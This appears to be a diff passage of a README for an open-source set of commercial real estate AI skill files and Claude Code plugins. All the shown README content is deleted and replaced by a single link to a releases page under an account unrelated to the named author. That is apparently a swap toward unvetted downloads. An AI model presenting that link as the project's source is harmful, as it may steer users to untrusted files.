-| **When Data is Missing** | How to handle gaps — use benchmarks, note assumptions, continue |
-| **Confidence Scoring** | How to rate the reliability of the analysis |
-| **Related Knowledge Bases** | Which companion files enhance this skill |
-
-New sector and role-based packs may also include companion research notes that document the source basis for new benchmarks, process guidance, and assumptions.
-
----
-
-## Project Structure
-
-```
-cre-agent-skills/
-├── README.md                              # This file
-├── LICENSE                                # Apache 2.0
-├── NOTICE                                # Attribution notice
-│
-├── skills/                                # 25 standalone skill files
-│   ├── due-diligence/                     #   7 property analysis skills
-│   │   ├── rent-roll-analyst.md
-│   │   ├── opex-analyst.md
-│   │   ├── market-study.md
-│   │   ├── physical-inspection.md
-│   │   ├── environmental-review.md
-│   │   ├── legal-title-review.md
-│   │   └── tenant-credit.md
-│   ├── underwriting/                      #   3 financial modeling skills
-│   │   ├── financial-model-builder.md
-│   │   ├── scenario-analyst.md
-│   │   └── ic-memo-writer.md
-│   ├── financing/                         #   3 debt sourcing skills
-│   │   ├── lender-outreach.md
-│   │   ├── quote-comparator.md
-│   │   └── term-sheet-builder.md
-│   ├── legal/                             #   6 legal review skills
-│   │   ├── psa-reviewer.md
-│   │   ├── title-survey-reviewer.md
-│   │   ├── estoppel-tracker.md
-│   │   ├── loan-doc-reviewer.md
-│   │   ├── insurance-coordinator.md
-│   │   └── transfer-doc-preparer.md
-│   ├── closing/                           #   2 transaction completion skills
-│   │   ├── closing-coordinator.md
-│   │   └── funds-flow-manager.md
-│   └── document-ingestion/                #   4 document parsing skills
-│       ├── document-classifier.md
-│       ├── rent-roll-parser.md
-│       ├── financials-parser.md
-│       └── offering-memo-parser.md
-│   └── industrial/                        #   8 industrial v1 skills
-│       ├── industrial-market-study.md
-│       ├── industrial-lease-roster-analyst.md
-│       └── ...
-│   └── brokerage/                        #   8 brokerage investment sales v1 skills
-│       ├── assignment-intake-manager.md
-│       ├── broker-opinion-of-value-builder.md
-│       └── ...
-│
-├── knowledge/                             # 12 domain knowledge reference files
-│   ├── underwriting-calc.md               #   Every CRE financial formula
-│   ├── risk-scoring.md                    #   9-category risk scoring framework
-│   ├── multifamily-benchmarks.md          #   Industry benchmarks by class/region
-│   ├── lender-criteria.md                 #   Lender qualification criteria
-│   └── legal-checklist.md                 #   Legal compliance checklists
-│   ├── industrial-benchmarks.md           #   Industrial subtype and leasing benchmarks
-│   ├── industrial-lease-structures.md     #   Industrial lease structure guidance
-│   └── industrial-lender-criteria.md      #   Industrial financing fit guidance
-│   ├── brokerage-investment-sales-process.md
-│   ├── broker-opinion-of-value-guidance.md
-│   ├── marketing-confidentiality-and-buyer-process.md
-│   └── offer-negotiation-and-closing-playbook.md
-│
-├── research/                              # 23 companion research notes across industrial and brokerage
-│   └── industrial/
-│   └── brokerage/
-│
-├── claude-code-plugins/                   # 8 ready-to-install Claude Code plugins
-│   ├── cre-due-diligence/                 #   /cre-due-diligence → 7 skills + 3 KBs
-│   │   ├── SKILL.md
-│   │   ├── skills/
-│   │   └── knowledge/
-│   ├── cre-underwriting/                  #   /cre-underwriting → 3 skills + 2 KBs
-│   │   ├── SKILL.md
-│   │   ├── skills/
-│   │   └── knowledge/
-│   ├── cre-financing/                     #   /cre-financing → 3 skills + 2 KBs
-│   │   ├── SKILL.md
-│   │   ├── skills/
-│   │   └── knowledge/
-│   ├── cre-legal/                         #   /cre-legal → 6 skills + 1 KB
-│   │   ├── SKILL.md
-│   │   ├── skills/
-│   │   └── knowledge/
-│   ├── cre-closing/                       #   /cre-closing → 2 skills + 2 KBs
-│   │   ├── SKILL.md
-│   │   ├── skills/
-│   │   └── knowledge/
-│   └── cre-document-ingestion/            #   /cre-document-ingestion → 4 skills
-│       ├── SKILL.md
-│       └── skills/
-│   └── cre-industrial/                    #   /cre-industrial → 8 skills + 3 KBs
-│   └── cre-brokerage/                     #   /cre-brokerage → 8 skills + 4 KBs
-│
-├── templates/
-│   └── sample-inputs/                     # Example input data for testing
-│       ├── deal-summary-template.md       #   Fill-in template for property details
-│       ├── rent-roll-sample.csv           #   Sample rent roll (10 units)
-│       └── t12-financials-sample.csv      #   Sample T-12 operating statement
-│
-└── docs/
-    ├── HOW-TO-USE.md                      # Platform-specific setup instructions
-    └── SKILL-INDEX.md                     # Quick reference with recommended combos
-```
-
----
-
-## Example Usage
-
-### Example: Rent Roll Analysis
-
-**Step 1:** Load `skills/due-diligence/rent-roll-analyst.md` into your AI tool (or use `/cre-due-diligence` in Claude Code)
-
-**Step 2:** Optionally also load `knowledge/multifamily-benchmarks.md` for market benchmarks
-
-**Step 3:** Provide your inputs:
-
-> Analyze this rent roll for Parkview Apartments, a 200-unit Class B multifamily at 1200 Park Avenue, Austin TX 78701.
->
-> [paste rent roll data — unit numbers, tenant names, lease dates, monthly rents, deposits, status]
->
-> Asking rents: Studio $1,050, 1BR $1,250, 2BR $1,550, 3BR $1,850
-
-**Step 4:** Get back structured analysis — unit summary, occupancy metrics, loss-to-lease calculation, tenant concentration risks, anomalies, revenue projections, and confidence scoring.
-
-### Example: Full Deal Package Processing
-
-```
-/cre-document-ingestion I just received the deal package for Riverside Gardens.
-Here are the files: [upload rent roll, T-12, offering memo]
-
-# After classification and parsing:
-/cre-due-diligence Analyze the rent roll data we just extracted
-/cre-due-diligence Benchmark the T-12 expenses against Class B multifamily
-/cre-underwriting Build a 5-year pro forma from the DD results
-/cre-financing Which lenders should we approach for this deal?
-```
-
-### Example: Industrial v1 Workflow
-
-```
-/cre-document-ingestion Classify this industrial deal package
-/cre-industrial Analyze the market for this 180,000 SF shallow-bay asset
-/cre-industrial Review the lease roster and rollover risk
-/cre-industrial Build the underwriting view
-/cre-industrial Write the IC memo
-```
-
-### Example: Brokerage Investment Sales v1 Workflow
-
-```
-/cre-brokerage Run assignment intake for this suburban office listing
-/cre-brokerage Build a broker opinion of value for this property
-/cre-brokerage Draft the listing proposal and OM structure
-/cre-brokerage Coordinate the buyer process and data room
-/cre-brokerage Level the bids and recommend the next step
-```
-
----
-
-## Common Workflows
-
-### "I just got a new deal package"
-1. **Document Classifier** → identify what's in the package
-2. **Rent Roll Parser** + **Financials Parser** + **Offering Memo Parser** → extract structured data
-3. **Rent Roll Analyst** + **OpEx Analyst** → validate the numbers
-4. **Financial Model Builder** → build the pro forma
-
-### "I need to underwrite this deal fast"
-1. **Rent Roll Analyst** → revenue quality
-2. **OpEx Analyst** → expense validation
-3. **Financial Model Builder** → pro forma and returns
-4. **Scenario Analyst** → stress test
-
-### "We're ready to present to the investment committee"
-1. **IC Memo Writer** → synthesize everything into a structured memo (load all prior analysis outputs as context)
-
-### "We need to source debt"
-1. **Lender Outreach** → identify lenders
-2. **Quote Comparator** → compare received quotes
-3. **Term Sheet Builder** → finalize terms
-
-### "We're heading into closing"
-1. **PSA Reviewer** → review the purchase agreement
-2. **Title & Survey Reviewer** → clear title issues
-3. **Estoppel Tracker** → manage tenant estoppels
-4. **Loan Doc Reviewer** → review loan docs
-5. **Insurance Coordinator** → verify coverage
-6. **Transfer Doc Preparer** → prepare transfer docs
-7. **Closing Coordinator** → manage the checklist
-8. **Funds Flow Manager** → prepare settlement statement
-
-### "I need a U.S. industrial acquisition workflow"
-1. **Document Classifier** → inventory incoming files
-2. **Industrial Market Study** → evaluate the submarket and building fit
-3. **Industrial Lease Roster Analyst** → measure WALT, concentration, and rollover
-4. **Industrial Lease Abstract Reviewer** → abstract reimbursements, repairs, options, and transfer rights
-5. **Industrial Physical Inspection** → assess condition and competitiveness
-6. **Industrial Underwriting Model Builder** → build the lease-driven base case
-7. **Industrial Financing Fit** → identify likely lender lanes
-8. **Industrial IC Memo Writer** → summarize the investment case
-
-### "I need a seller-side investment sales workflow"
-1. **Assignment Intake Manager** → organize authority, seller goals, and missing data
-2. **Broker Opinion of Value Builder** → build the pricing recommendation
-3. **Listing Proposal Builder** → prepare the seller-facing proposal
-4. **Offering Memorandum and Teaser Writer** → create the buyer-facing marketing package
-5. **Buyer Process and Data Room Manager** → control confidentiality, buyer vetting, tours, and Q&A
-6. **Call for Offers and Bid Leveling Analyst** → compare bids and recommend leveling or BAFO
-7. **Deal Term Negotiation Brief Builder** → frame the seller-side negotiation posture
-8. **PSA to Close Transaction Coordinator** → coordinate the deal through closing
-
----
-
-## FAQ
-
-### Do I need API keys to use these skills?
-
-No. These are plain Markdown files. You load them into whatever AI tool you already use. There are no API calls, no external services, no dependencies.
-
-### Can I use just one skill without installing everything?
-
-Yes. Every skill file in the `skills/` directory is completely self-contained. Open the file, copy the content, paste it into your AI tool. You don't need the full repo.
-
-### What's the difference between `skills/` and `claude-code-plugins/`?
-
-The `skills/` directory contains individual `.md` files — one per analysis task. Use these when you want a single skill in any AI platform.
-
-The `claude-code-plugins/` directory packages those same skills into department-level bundles for Claude Code, with a `SKILL.md` entry point that adds slash command support, automatic routing, and bundled knowledge bases. Use these if you're working in Claude Code and want the full department toolkit.
-
-### How do the Claude Code plugins know which skill to use?
-
-Each plugin's `SKILL.md` file contains a routing table. When you invoke `/cre-due-diligence Analyze this rent roll`, Claude reads the routing table, identifies that rent roll analysis maps to `skills/rent-roll-analyst.md`, loads that file, and follows its instructions. You don't need to know the individual skill file names.
-
-### Can I modify the skills?
-
-Yes. Apache 2.0 license — you can modify, extend, and redistribute. Fork the repo, adapt the skills to your firm's specific investment criteria, thresholds, or analysis standards. Just keep the attribution.
-
-### How do these relate to the CRE Acquisition Orchestrator?
-
-The [CRE Acquisition Orchestrator](https://github.com/ahacker-1/cre-acquisition-orchestrator) is the full multi-agent pipeline — 31 agents with orchestration logic, phase dependencies, checkpoint/resume, JSON schema data contracts, and a real-time dashboard. It's the "enterprise system" that runs all these skills together in an automated pipeline.
-
-This repo extracts those same agents into standalone skills you can use individually. All orchestration-specific code (checkpoints, logging protocols, pipeline data contracts) has been stripped. All domain expertise (formulas, thresholds, analysis logic, benchmarks) has been preserved.
-
-### Can I use these for property types other than multifamily?
-
-Yes. The original repo was optimized for multifamily acquisitions, and those skills remain intact. As of v1.1.0, the repo also includes **Industrial v1** for U.S. industrial acquisitions. As of v1.2.0, it also includes **Brokerage Investment Sales v1** for U.S. seller-side commercial investment sales process work. Other property types like office, retail, and self-storage are not yet full first-class property packs, though many shared and brokerage workflows transfer.
-
----
-
-## Want the Full Pipeline?
-
-These skills are extracted from the [CRE Acquisition Orchestrator](https://github.com/ahacker-1/cre-acquisition-orchestrator) — a 31-agent multi-agent system that runs all of these skills together with:
-
-- **Hierarchical orchestration** — master → phase → specialist agents
-- **Phase dependencies and parallel execution** — Legal starts at DD 80%
-- **JSON Schema data contracts** — every handoff validated at runtime
-- **3-tier checkpoint/resume** — nothing lost on interruption
-- **Real-time 9-tab React dashboard** — live pipeline visualization
-- **Deterministic simulation engine** — no API keys needed to demo
-- **Investment committee memo generation** — automated go/no-go verdict
-
-If you want individual tools, you're in the right place. If you want the full automated pipeline, check out the orchestrator.
-
----
-
-## Who Is This For?
-
-- **CRE analysts and associates** who want AI-assisted due diligence, underwriting, or legal review for specific tasks
-- **Acquisition teams** that want to enhance specific parts of their workflow without adopting a full system
-- **Proptech developers** looking for domain-specific prompt engineering patterns for CRE
-- **AI engineers** who want to see how deep domain expertise translates into structured AI skill files
-- **Anyone learning CRE** — these skills encode institutional-quality analysis frameworks that serve as educational references
-
----
-
-## Author
-
-**Avi Hacker, J.D.** — AI Consulting for Commercial Real Estate
-
-I work with CRE firms to build AI systems that transform their acquisition and underwriting workflows. These skills encode the same domain expertise I use with clients, open-sourced so the whole industry can build on them.
-
-- [Website — The AI Consulting Network](https://www.theaiconsultingnetwork.com)
-- [Newsletter — AI Tactical Toolbox](https://avihacker.substack.com)
-- [LinkedIn](https://linkedin.com/in/avi-hacker)
-
-If you're building something in this space or want to talk about how AI can transform CRE workflows, reach out.
-
----
-
-## License
-
-[Apache 2.0](LICENSE) — Use freely, attribution required. See [NOTICE](NOTICE) for details.
+https://github.com/XAKLESK/cre-agent-skills/releases
